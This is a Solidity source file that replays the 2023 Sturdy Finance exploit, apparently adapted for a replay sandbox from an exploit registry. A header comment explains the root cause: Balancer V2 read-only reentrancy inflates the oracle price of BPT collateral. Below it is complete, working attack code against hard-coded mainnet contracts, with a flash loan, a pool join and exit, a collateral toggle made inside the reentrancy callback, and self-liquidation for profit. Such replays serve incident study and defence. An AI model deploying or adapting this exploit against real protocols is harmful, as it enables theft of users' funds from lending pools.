// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-Sturdy).
// Faithful, no-import copy of `ContractTest`/`Exploiter` from
// evm-hack-registry/2023-06-Sturdy_exp/test/Sturdy_exp.sol, with
// `testExploit()` renamed to `run()` (the recorded entrypoint) and Foundry's
// `Test`/`console`/`vm.label` dependencies stripped (they are not needed to
// replay the attack — only to print progress logs / label addresses in the
// original trace). Everything else — the Aave V3 flash loan, the Curve
// steCRV mint, the `Exploiter` helper deployed via `new` mid-attack, the
// Balancer join/exit, the Sturdy collateral deposit/borrow/liquidation, and
// the read-only-reentrancy price read inside `receive()` — is copied
// verbatim.
//
// Root cause (Sturdy Finance, June 2023 — Balancer V2 read-only reentrancy
// inflates BPT collateral price):
//
// Sturdy accepts Balancer `B-stETH-STABLE` LP tokens (BPT) as collateral and
// prices them through a custom "Chainlink-shaped" source whose
// `latestAnswer()` derives the BPT price from B_STETH_STABLE.getRate(),
// which itself reads Balancer.getPoolTokens(poolId) — the pool's *current*,
// live reserves. Balancer V2's Vault has a well-known read-only reentrancy
// flaw: `exitPool` pays out the recipient (here, native ETH via
// `WETH.withdraw` -> the attacker's `receive()`) BEFORE the Vault finishes
// updating its own cached invariant/reserve accounting. Reading
// `getPoolTokens()`/`getRate()` from inside that callback window observes
// stale, inflated reserves.
//
// The attacker:
//   1. Flash-borrows 50,000 wstETH + 60,000 WETH from Aave V3.
//   2. Adds 1,100 ETH to Curve's steCRV pool to mint ~1,023.8 steCRV.
//   3. Deploys a fresh `Exploiter` helper (via `new`, mid-attack), forwards
//      the WETH/wstETH/steCRV to it, and calls `yoink()`:
//      a. Joins the Balancer B-stETH-STABLE pool with 50,000 wstETH +
//         57,000 WETH, minting ~109,517 BPT.
//      b. Deposits 1,000 steCRV + ~233.35 BPT as collateral into Sturdy,
//         then borrows 513.37 WETH.
//      c. Calls `Balancer.exitPool()` to redeem ~109,284 BPT. Balancer
//         withdraws WETH and sends ETH via a raw `receive()` callback
//         DURING the exit, before the pool's internal reserves are fully
//         updated.
//      d. Inside `receive()` (the read-only-reentrancy window): Sturdy's
//         oracle (`SturdyOracle.getAssetPrice(cB_stETH_STABLE)`) is queried
//         and reports the BPT at ~3.008 ETH instead of its true ~1.035 ETH
//         (~2.9x inflated) because it derives from the mid-exit, stale
//         Balancer reserves. While inflated, the attacker calls
//         `lendingPool.setUserUseReserveAsCollateral(csteCRV, false)` —
//         the (falsely) revalued ~233 BPT alone appears to comfortably
//         cover the 513 WETH debt, so Sturdy lets the attacker disable
//         steCRV as collateral without a health-factor revert.
//      e. Withdraws the now-unencumbered 1,000 steCRV from Sturdy.
//      f. Once the reentrancy window closes, the BPT price reverts to
//         ~1.035 ETH and the remaining ~233 BPT-only position looks
//         under-collateralized against the 513 WETH debt (health factor
//         ~0.4374) — the attacker self-liquidates their own position with
//         ~236.70 WETH to reclaim the 233 BPT (worth far more: ~106 wstETH
//         + 120 WETH), profiting off their own liquidation.
//      g. Removes the reclaimed BPT from Balancer for the final
//         wstETH/WETH, and forwards everything back to the caller.
//   4. Unwinds all remaining steCRV/wstETH/stETH back to WETH and repays
//      the Aave flash loan + premiums, keeping the WETH surplus as profit.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
    function approve(address guy, uint256 wad) external returns (bool);
    function transfer(address dst, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function deposit() external payable;
}

interface IwstETH {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
}

interface IMetaStablePool {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
    function getPoolId() external view returns (bytes32);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 min_amount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
}

interface ILendingPool {
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function liquidationCall(
        address collateralAsset,
        address debtAsset,
        address user,
        uint256 debtToCover,
        bool receiveAToken
    ) external;

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
}

interface ILPVault {
    function depositCollateralFrom(address _asset, uint256 _amount, address _user) external payable;
    function withdrawCollateral(address _asset, uint256 _amount, uint256 _slippage, address _to) external;
}

interface IBalancerVault {
    struct JoinPoolRequest {
        address[] asset;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        address[] asset;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request)
        external
        payable;

    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request)
        external
        payable;
}

interface IBalancerQueries {
    function queryJoin(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.JoinPoolRequest memory request
    ) external returns (uint256 bptOut, uint256[] memory amountsIn);

    function queryExit(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.ExitPoolRequest memory request
    ) external returns (uint256 bptIn, uint256[] memory amountsOut);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ISturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

contract SturdyExploit {
    IWETH9 WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH wstETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IMetaStablePool B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    ILendingPool lendingPool = ILendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    // Renamed from testExploit(). Kicks off the Aave V3 flash loan; the rest
    // of the attack runs inside executeOperation() (the flash-loan callback).
    function run() external {
        address[] memory assets = new address[](2);
        assets[0] = address(wstETH);
        assets[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 50_000 * 1e18;
        amounts[1] = 60_000 * 1e18;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
        // 1. Borrow 50,000 wstETH and 60,000 WETH from Aave as a flashloan.
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WETH.withdraw(1100 ether);
        uint256[2] memory amount;
        amount[0] = 1100 ether;
        amount[1] = 0;
        // 2. Add 1,100 ETH to steCRV pool to mint 1,023 steCRV.
        LidoCurvePool.add_liquidity{value: 1100 ether}(amount, 1000 ether);

        for (uint256 i; i < 1; i++) {
            Exploiter exploiter = new Exploiter();
            WETH.transfer(address(exploiter), WETH.balanceOf(address(this)));
            wstETH.transfer(address(exploiter), wstETH.balanceOf(address(this)));
            steCRV.transfer(address(exploiter), steCRV.balanceOf(address(this)));
            exploiter.yoink();
        }

        LidoCurvePool.remove_liquidity_one_coin(steCRV.balanceOf(address(this)), 0, 1000 * 1e18); // burn steCRV, get WETH
        wstETH.unwrap(wstETH.balanceOf(address(this)) - amounts[0] - premiums[0]); // burn redundant wstETH, get WETH
        stETH.approve(address(LidoCurvePool), stETH.balanceOf(address(this)));
        LidoCurvePool.exchange(1, 0, stETH.balanceOf(address(this)), 1); // swap stETH to ETH
        WETH.deposit{value: address(this).balance}();

        IERC20(assets[0]).approve(address(aaveV3), amounts[0] + premiums[0]);
        IERC20(assets[1]).approve(address(aaveV3), amounts[1] + premiums[1]);

        return true;
    }

    receive() external payable {}
}

contract Exploiter {
    address owner;
    uint256 nonce;
    IWETH9 WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH wstETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 steCRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IMetaStablePool B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ILendingPool lendingPool = ILendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault AuraBalancerLPVault = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault ConvexCurveLPVault2 = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IBalancerQueries BalancerQueries = IBalancerQueries(0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5);
    ISturdyOracle SturdyOracle = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);
    address cB_stETH_STABLE = 0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746;
    address csteCRV = 0x901247D08BEbFD449526Da92941B35D756873Bcd;

    constructor() {
        owner = msg.sender;
    }

    function yoink() external {
        joinBalancerPool();
        depositCollateralAndBorrow();
        exitBalancerPool();
        withdrawCollateralAndLiquidation();
        removeBalancerPoolLiquidity();
        WETH.deposit{value: address(this).balance}();
        wstETH.transfer(owner, wstETH.balanceOf(address(this)));
        WETH.transfer(owner, WETH.balanceOf(address(this)));
        steCRV.transfer(owner, steCRV.balanceOf(address(this)));
    }

    function setJoinData(uint256 amt) internal view returns (IBalancerVault.JoinPoolRequest memory request) {
        uint256[] memory amountIn = new uint256[](2);
        amountIn[0] = 50_000 * 1e18;
        amountIn[1] = 57_000 * 1e18;
        bytes memory data = abi.encode(uint256(1), amountIn, amt);
        request = IBalancerVault.JoinPoolRequest({
            asset: new address[](2),
            maxAmountsIn: amountIn,
            userData: data,
            fromInternalBalance: false
        });
        request.asset[0] = address(wstETH);
        request.asset[1] = address(WETH);
        return request;
    }

    function joinBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.JoinPoolRequest memory request = setJoinData(0);
        (uint256 bptOut,) = BalancerQueries.queryJoin(poolId, address(this), address(this), request);
        wstETH.approve(address(Balancer), 50_000 * 1e18);
        WETH.approve(address(Balancer), 57_000 * 1e18);
        request = setJoinData(bptOut);
        // 3. Add 50,000 wstETH and 57,000 WETH to the Balancer B-stETH-STABLE pool to mint 109,517 B-stETH-STABLE
        Balancer.joinPool(poolId, address(this), address(this), request);
    }

    function depositCollateralAndBorrow() internal {
        // 4. Deposit 1,000 steCRV and 233 B-stETH-STABLE as collateral into Sturdy.
        steCRV.approve(address(ConvexCurveLPVault2), 1000 * 1e18);
        ConvexCurveLPVault2.depositCollateralFrom(address(steCRV), 1000 * 1e18, address(this));
        B_STETH_STABLE.approve(address(AuraBalancerLPVault), 233_348_773_557_117_598_739);
        AuraBalancerLPVault.depositCollateralFrom(address(B_STETH_STABLE), 233_348_773_557_117_598_739, address(this));

        // 5. Borrow 513 WETH from Sturdy.
        lendingPool.borrow(address(WETH), 513_367_301_825_658_717_226, 2, 0, address(this));
    }

    function setExitData(uint256 amt) internal view returns (IBalancerVault.ExitPoolRequest memory request) {
        uint256[] memory amountOut = new uint256[](2);
        amountOut[0] = 0;
        amountOut[1] = 0;
        bytes memory data = abi.encode(uint256(1), amt);
        request = IBalancerVault.ExitPoolRequest({
            asset: new address[](2),
            minAmountsOut: amountOut,
            userData: data,
            toInternalBalance: false
        });
        request.asset[0] = address(wstETH);
        request.asset[1] = address(0);
        return request;
    }

    function exitBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 amt = B_STETH_STABLE.balanceOf(address(this));
        IBalancerVault.ExitPoolRequest memory request = setExitData(amt);
        BalancerQueries.queryExit(poolId, address(this), address(this), request);
        // 6. Remove 109,284 B-stETH-STABLE from the Balancer B-stETH-STABLE pool to receive wstETH and WETH.
        B_STETH_STABLE.approve(address(Balancer), B_STETH_STABLE.balanceOf(address(this)));

        // Before Read-Only-Reentrancy Collateral Price (honest, pre-exit reserves)
        SturdyOracle.getAssetPrice(cB_stETH_STABLE);
        Balancer.exitPool(poolId, address(this), payable(address(this)), request);
    }

    receive() external payable {
        nonce++;
        if (nonce == 1) {
            // Manipulate the price of B-stETH-STABLE and set steCRV as non-collateral during the manipulation. As the price of
            // B-stETH-STABLE increases threefold, the protocol considers the attacker's 233 collateralized B-stETH-STABLE enough
            // to cover the 513 WETH debt. Consequently, the attacker's steCRV is allowed to be no longer used as collateral.
            // In Read-Only-Reentrancy Collateral Price (inflated, mid-exit reserves) — THE VULNERABLE READ.
            SturdyOracle.getAssetPrice(cB_stETH_STABLE);
            // 7. set steCRV as non-collateral during the manipulation.
            lendingPool.setUserUseReserveAsCollateral(address(csteCRV), false);
        }
    }

    function withdrawCollateralAndLiquidation() internal {
        // After Read-Only-Reentrancy Collateral Price (reverted back to honest reserves)
        SturdyOracle.getAssetPrice(cB_stETH_STABLE);
        // 8. Withdraw 1,000 steCRV from Sturdy.
        ConvexCurveLPVault2.withdrawCollateral(address(steCRV), 1000 * 1e18, 10, address(this));
        (, uint256 totalDebt,,,,) = lendingPool.getUserAccountData(address(this));
        // 9. attacker liquidates their position to reclaim collateral with 236 WETH
        // As the price of B-stETH-STABLE returns to normal, the attacker liquidates their position with 236 WETH to reclaim
        // 233 B-stETH-STABLE (worth approximately 106 wstETH + 120 WETH).
        WETH.approve(address(lendingPool), totalDebt);
        lendingPool.liquidationCall(address(B_STETH_STABLE), address(WETH), address(this), totalDebt, false);
    }

    function removeBalancerPoolLiquidity() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 amt = B_STETH_STABLE.balanceOf(address(this));
        IBalancerVault.ExitPoolRequest memory request = setExitData(amt);
        BalancerQueries.queryExit(poolId, address(this), address(this), request);
        B_STETH_STABLE.approve(address(Balancer), B_STETH_STABLE.balanceOf(address(this)));
        // 10. Remove 233 B-stETH-STABLE from the Balancer B-stETH-STABLE pool to receive 106 wstETH and 120 WETH.
        Balancer.exitPool(poolId, address(this), payable(address(this)), request);
    }
}
